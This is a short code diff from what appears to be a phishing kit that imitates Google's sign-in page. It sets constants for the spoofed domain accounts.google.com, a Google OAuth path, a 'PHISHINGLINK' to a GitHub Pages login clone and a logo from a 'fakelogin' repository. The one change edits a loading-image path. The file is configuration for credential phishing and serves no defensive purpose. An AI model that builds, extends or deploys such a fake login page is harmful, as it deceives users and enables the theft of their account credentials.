@@ -6,7 +6,7 @@ const DOMAINNAMEVERIFY = "accounts.google.com";
 const loadDOMAINPATH = "about:blank";
 const DOMAINPATH = "/o/oauth2/auth/identifier?redirect_uri=storagerelay&%3Fid%3Dauth74362&response_type=permission%20id_token&scope=email%20profile%20openid&openid.realm&include_granted_scopes=true&&fetch_basic_profile=true&gsiwebsdk=2&flowName=GeneralOAuthFlow";
 const PHISHINGLINK = "https://lexaiko.github.io/loginclone.github.io/";
-const loadLOGO = "/loading.gif";
+const loadLOGO = "loading.gif";
 const LOGO = "https://raw.githubusercontent.com/lexaiko/fakelogin/main/google.svg";
 const loadTIME = 1000;
 
